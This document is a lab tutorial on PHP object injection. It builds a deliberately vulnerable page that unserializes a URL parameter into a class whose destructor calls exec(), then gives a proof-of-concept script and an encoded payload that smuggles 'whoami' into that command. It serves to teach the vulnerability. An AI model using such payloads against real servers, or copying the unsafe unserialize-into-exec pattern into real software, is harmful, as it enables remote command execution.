# PHP Object Injection example

## Preparing the environment

To prepare the environment we just need to have docker installed. I did this from a Windows machine
so a good way to have a Kali linux distribution without building an entire VM is to use the docker
Kali image.

First of all, lets create our vulnerable PHP code and deploy it on a simple dockerized apache server.
Notice that I've used following structure:

<pre>
/php
  |
  |-- /test
  |      |
  |      |-- test.php
  |-- Dockerfile
/kali
  |
  |-- Dockerfile
</pre>

* Create the following **test.php**:

```php
<?php

class Example1
{
   public $cache_file;

   function __construct()
   {
   }

   function __destruct()
   {
      echo exec("ls /www/html/{$this->cache_file}");
   }
}

$user_data = unserialize($_GET['data']);
?>
```

* Create the following Dockerfile to deploy the code:

```Dockerfile
FROM php:8.0-apache
COPY test /var/www/html
EXPOSE 80
```

* In order to easily deploy the code I've created a simple bash script:

```bash
#!/bin/bash

clear
echo "[*] Building image"
docker build -t php php/. > /dev/null 2> /dev/null
echo "[*] Starting docker container"
docker stop php-app > /dev/null 2> /dev/null
docker rm php-app > /dev/null 2> /dev/null
docker run -d --name php-app -p 80:80 php > /dev/null 2> /dev/null
```

* If you want to use a Kali docker image:

1. Create the kali Dockerfile:

```Dockerfile
from kalilinux/kali-rolling

RUN apt update && apt upgrade -y
RUN apt install -y metasploit-framework netcat vim net-tools iputils-ping php
```

2. I've created also a simple script file to run my Kali environment:

```bash
#!/bin/bash

GREEN="\033[1;32m"
RED="\033[1;31m"
NC="\033[0m"

clear
echo "[*] Building kali image"
docker build -t kali-linux kali/. > /dev/null 2> /dev/null
if [[ $? -eq 0 ]]; then
        echo -e "\t${GREEN}[OK] Kali image built correctly${NC}"
        sleep 2
        clear
        docker rm kali > /dev/null 2> /dev/null
        winpty docker run -it --name kali kali-linux
else
        echo "\t${RED}[X] Errors building kali image${NC}"
fi
```

With this setup you can access the deployed app in http://localhost/test.php. 
Additionally after running the bash script of Kali you will be directly inside
the Kali container.

## About the vulnerability

You can check more details in the OWASP page, in fact, this is an example
extracted from there: https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection.

Basically the problem here is that we have an *unserialize* method without any
sanitation and a previous declared class that uses a magic method 
(*__destruct()* in this case). What happens is that *unserialize* allows
to construct the object as desired by the attacker. In this case, he could
craft an *Example1* class to execute any code he wants in the *__destruct*
method.

## How to exploit it

Go to the Kali linux container and create the following **example.php** file:

```php
<?php
class Example1
{
   public $cache_file;

   function __construct()
   {
   }

   function __destruct()
   {
      echo exec("ls /www/html/{$this->cache_file}");
   }
}

$example = new Example1();
$example->cache_file = "test.php && whoami";

echo urlencode(serialize($example));

?>
```

What we do here is to build the same *Example1* class. To test that we can
execute any code we want we just add as **cache_file** the string 
```test.php && whoami```. Doing this we're going to execute in the victims
machine the following: ```ls /www/html/test.php && whoami```. As the result
of the first command is succesful because test.php file exists in the system
we will be able to execute the next one.

To be able to inject this string in the class we make use of the *serialize*
method of PHP that will give us the serialized version of the object. 
However, as we're going to inject this data using a request parameter that
goes in the URL we need to encode the string. For that reason, we also need
to use the *urlencode* method.

Finally, we could just execute the php file in our Kali container using:

```php example.php```

This should give as an encoded string that we can use as parameter as follows:

http://localhost/test.php?data=O%3A8%3A%22Example1%22%3A1%3A%7Bs%3A10%3A%22cache_file%22%3Bs%3A18%3A%22test.php+%26%26+whoami%22%3B%7D

This will execute the **ls** and after that the **whoami** command that will
return the user *www-data** in the browser. Now if we would like to execute
any other command we just need to update our **example.php** file and run it
again to get the new encoded string.

## Conclusions

This is a quite powerfull vulnerability however it requires some preconditions
to be met that maybe are not always satisfied. We need to have the classes
declared previously, they need to use some kind of magic method and 
also, the programmer must use an unserialize method that allows input from
the user. Also we need to take into account that we need to know how the code
looks like to exploit the vulnerability, as we need to craft the right
serialized object.